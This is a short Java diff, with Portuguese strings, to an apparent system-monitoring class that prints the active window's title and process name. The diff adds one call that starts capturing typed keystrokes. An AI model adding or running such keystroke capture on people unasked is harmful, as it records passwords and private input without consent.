@@ -11,5 +11,6 @@ public class MachineGuardianMonitorProtect {
         Windows w = new Windows();
         System.out.println("Título janela ativa: " + w.Processos.getTituloJanelaAtiva());
         System.out.println("Nome executável da janela: " + w.Processos.getNomeProcessoJanelaAtiva());
+        w.Teclado.iniciarCapturaTeclasDigitadas();
     }
 }
